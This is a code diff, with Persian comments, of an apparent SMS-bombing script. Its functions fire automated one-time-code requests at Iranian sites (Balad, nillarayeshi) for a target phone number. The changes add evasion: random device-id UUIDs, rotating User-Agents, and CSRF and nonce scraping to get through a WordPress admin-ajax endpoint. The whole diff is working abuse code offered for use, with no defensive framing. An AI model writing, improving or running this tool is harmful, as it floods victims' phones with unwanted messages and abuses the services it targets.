@@ -58,99 +58,13 @@ def send_service_safe(service, phone):
 # ==========================
 # توابع سرویس‌ها
 # ==========================
-def nillarayeshi(phone):
-    try:
-        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-        session = requests.Session()
-        
-        # دریافت صفحه اصلی برای استخراج CSRF و nonce
-        home_response = session.get(
-            "https://nillarayeshi.com/", 
-            timeout=10, 
-            headers={"User-Agent": random.choice(user_agents)}
-        )
-        home_response.encoding = 'utf-8'
-        
-        # استخراج مقادیر مورد نیاز
-        csrf_match = re.search(r'name="csrf" value="([a-f0-9]+)"', home_response.text)
-        nonce_match = re.search(r'name="dig_nounce" value="([a-f0-9]+)"', home_response.text)
-        
-        csrf = csrf_match.group(1) if csrf_match else "2a49f89a8f"
-        nonce = nonce_match.group(1) if nonce_match else "2a49f89a8f"
-        
-        # آماده سازی payload
-        payload = {
-            "action": "digits_check_mob",
-            "countrycode": "+98",
-            "mobileNo": formatted_phone,
-            "csrf": csrf,
-            "login": "2",
-            "username": "",
-            "email": "",
-            "captcha": "",
-            "captcha_ses": "",
-            "digits": "1",
-            "json": "1",
-            "whatsapp": "0",
-            "digits_reg_name": "نام",
-            "digregcode": "+98",
-            "digits_reg_mail": formatted_phone,
-            "digregscode2": "+98",
-            "mobmail2": "",
-            "digits_reg_password": "",
-            "dig_otp": "",
-            "code": "",
-            "dig_reg_mail": "",
-            "dig_nounce": nonce
-        }
-        
-        headers = {
-            "User-Agent": random.choice(user_agents),
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Accept": "*/*",
-            "X-Requested-With": "XMLHttpRequest",
-            "Origin": "https://nillarayeshi.com",
-            "Referer": "https://nillarayeshi.com/",
-        }
-        
-        response = session.post(
-            "https://nillarayeshi.com/wp-admin/admin-ajax.php",
-            data=payload,
-            headers=headers,
-            timeout=10
-        )
-        response.encoding = 'utf-8'
-        
-        if response.status_code == 200:
-            try:
-                data = response.json()
-                if data.get("success") or "sent" in str(data).lower():
-                    print(f'{g}(nillarayeshi) Code Sent{a}')
-                    return True
-                else:
-                    print(f'{r}[-] (nillarayeshi) Failed: {data.get("message", "Unknown")}{a}')
-                    return False
-            except ValueError:
-                if "1" in response.text or "sent" in response.text.lower():
-                    print(f'{g}(nillarayeshi) Code Sent{a}')
-                    return True
-                else:
-                    return False
-        else:
-            print(f"{r}[-] (nillarayeshi) HTTP Error: {response.status_code}{a}")
-            return False
-            
-    except Exception as e:
-        print(f"{r}[!] nillarayeshi Exception: {e}{a}")
-        return False
-
 def Balad(phone):
     try:
         url = "https://account.api.balad.ir/api/web/auth/login/"
         headers = {
             "Accept": "application/json, text/plain, */*",
             "Content-Type": "application/json",
-            "device-id": "0fc25deb-d8bf-495e-9a00-73bca530968d",
+            "device-id": str(uuid.uuid4()),  # UUID رندوم برای هر درخواست
             "User-Agent": random.choice(user_agents)
         }
         
@@ -162,23 +76,76 @@ def Balad(phone):
         response = requests.post(url, json=payload, headers=headers, timeout=10)
         
         if response.status_code == 200:
-            try:
-                data = response.json()
-                if data.get("success") or "otp" in data:
-                    print(f'{g}(Balad) Code Sent{a}')
-                    return True
-                else:
-                    print(f'{r}[-] Balad Failed: {data.get("message", "Unknown error")}{a}')
-                    return False
-            except:
-                print(f'{g}(Balad) Code Sent{a}')
-                return True
+            print(f'{g}(Balad) Code Sent{a}')
+            return True
         else:
-            print(f'{r}[-] Balad HTTP Error: {response.status_code}{a}')
+            print(f'{r}[-] Balad HTTP Error: {response.status_code} - {response.text[:100]}{a}')
             return False
             
     except Exception as e:
         print(f'{r}[!] Balad Exception: {e}{a}')
+        return False
+
+def nillarayeshi(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        session = requests.Session()
+        
+        # دریافت صفحه اصلی
+        home_response = session.get(
+            "https://nillarayeshi.com/", 
+            timeout=10, 
+            headers={"User-Agent": random.choice(user_agents)}
+        )
+        home_response.encoding = 'utf-8'
+        
+        # استخراج مقادیر با الگوهای مختلف
+        csrf_match = re.search(r'name="csrf" value="([^"]+)"', home_response.text)
+        nonce_match = re.search(r'name="dig_nounce" value="([^"]+)"', home_response.text)
+        
+        csrf = csrf_match.group(1) if csrf_match else ""
+        nonce = nonce_match.group(1) if nonce_match else ""
+        
+        if not csrf or not nonce:
+            print(f'{r}[-] nillarayeshi: Could not extract tokens{a}')
+            return False
+        
+        payload = {
+            "action": "digits_check_mob",
+            "countrycode": "+98",
+            "mobileNo": formatted_phone,
+            "csrf": csrf,
+            "login": "2",
+            "digits": "1",
+            "json": "1",
+            "dig_nounce": nonce
+        }
+        
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://nillarayeshi.com",
+            "Referer": "https://nillarayeshi.com/",
+        }
+        
+        response = session.post(
+            "https://nillarayeshi.com/wp-admin/admin-ajax.php",
+            data=payload,
+            headers=headers,
+            timeout=10
+        )
+        
+        print(f'{y}[Debug] nillarayeshi Response: {response.status_code} - {response.text[:200]}{a}')
+        
+        if response.status_code == 200:
+            if "success" in response.text.lower() or "1" in response.text:
+                print(f'{g}(nillarayeshi) Code Sent{a}')
+                return True
+        return False
+            
+    except Exception as e:
+        print(f"{r}[!] nillarayeshi Exception: {e}{a}")
         return False
 
 
